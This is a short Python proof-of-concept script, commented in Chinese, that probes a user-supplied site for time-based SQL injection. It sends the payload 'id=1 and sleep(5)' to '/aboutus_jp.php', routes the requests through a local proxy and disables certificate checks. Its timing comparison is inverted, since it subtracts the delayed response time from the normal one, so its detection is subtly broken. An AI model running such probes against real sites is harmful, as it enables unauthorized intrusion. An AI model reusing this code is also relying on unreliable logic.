import time
import requests
import argparse

# 禁用SSL证书警告
requests.packages.urllib3.disable_warnings()

# 展示程序的横幅信息
def banner():
    test = """
███████╗ ██████╗ ██╗     ██╗        ███████╗██╗     ███████╗███████╗██████╗ 
██╔════╝██╔═══██╗██║     ██║        ██╔════╝██║     ██╔════╝██╔════╝██╔══██╗
███████╗██║   ██║██║     ██║        ███████╗██║     █████╗  █████╗  ██████╔╝
╚════██║██║▄▄ ██║██║     ██║        ╚════██║██║     ██╔══╝  ██╔══╝  ██╔═══╝ 
███████║╚██████╔╝███████╗██║███████╗███████║███████╗███████╗███████╗██║     
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝╚═╝                                                                        
"""
    print(test)

# 主函数
def main():
    banner()
    # 创建命令行参数解析器
    parser = argparse.ArgumentParser(description="SQL注入_延时注入脚本")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter url', required=True)
    args = parser.parse_args()
    poc(args.url)

# 漏洞检测函数
def poc(target):
    # 定义两个请求的payload
    payload1 = '/aboutus_jp.php?id=1'  # 正常请求
    payload2 = '/aboutus_jp.php?id=1 and sleep(5)'  # 延时请求
    proxies = {
        'http': 'http://127.0.0.1:7890',  # 代理设置
        'https': 'http://127.0.0.1:7890'
    }

    # 发送正常请求
    res1 = requests.get(url=target + payload1, verify=False, proxies=proxies)
    # 发送包含延时的请求
    res2 = requests.get(url=target + payload2, verify=False, proxies=proxies)
    # 响应时间
    time1 = res1.elapsed.total_seconds()
    time2 = res2.elapsed.total_seconds()
    # 检查是否存在延时注入漏洞
    if time1 - time2 >= 5 and time1 > 5:
        print(f"[+]{target} 存在延时注入漏洞")

# 程序入口，调用主函数
if __name__ == '__main__':
    main()